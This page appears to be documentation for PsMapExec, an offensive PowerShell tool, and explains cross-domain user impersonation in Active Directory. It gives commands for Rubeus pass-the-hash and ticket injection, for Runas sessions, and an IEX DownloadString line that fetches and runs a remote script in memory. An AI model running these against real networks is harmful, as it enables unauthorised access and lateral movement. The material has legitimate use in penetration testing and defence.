# Cross Domain Usage

PsMapExec has the ability to impersonate users on one domain to access resources on a different domain.&#x20;

When accessing resources across domain and impersonating a user we need two parameters:

* UserDomain: The domain of the user we are impersonating
* Domain: The target domain where we intended to access resources

{% code overflow="wrap" %}
```powershell
PsMapExec -Targets All -Domain child.security.local -UserDomain security.local -username Moe -Password Password -method [Method] -Command [Command]
```
{% endcode %}

In the command example shown above we are getting all computers in the domain child.security.local and impersonating the user Moe whose account resides in the security.local domain.&#x20;

As security.local is a parent to the child domain child.security.local there is a trust between them and the user moe can access resources in the child domain.

### CurrentUser

Alternatively Rubeus or Runas.exe can be used to create a new logon session for a user in an alternative domain and the `-CurrentUser` switch can be applied to work in the current logon session context.

Simply put, Runas.exe is the most straightforward way of acheiving this if you have a password for the user you wish to impersonate. Otherwise, Rubeus will need to be used if you need to use a Hash or a Kerberos ticket.

Create Logon session

<pre class="language-powershell"><code class="lang-powershell"># Runas.exe
Runas.exe /user:[Domain]\[User] Powershell.exe
<strong>
</strong><strong># Rubeus
</strong>Rubeus.exe createnetonly /program:c:\windows\system32\cmd.exe /show

# AskTGT and inject in new session
Rubeus.exe asktgt /user:[User] /domain:[Domain] /hash:[Hash] or /password:[Password] /ptt

# Invoke-Rubeus
Invoke-Rubeus -Command "createnetonly /program:c:\windows\system32\cmd.exe /show"

# AskTGT and inject in new session
Invoke-Rubeus -Command "asktgt /user:[User] /domain:[Domain] /hash:[Hash] or /password:[Password] /ptt"
</code></pre>

Then load PsMapExec into the new logon session and run with `-CurrentUser`.

```powershell
# Load into memory
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")# Execute
PsMapExec -CurrentUser -Targets All -Domain [Domain] -Method [Method] -Command [Command] 
```
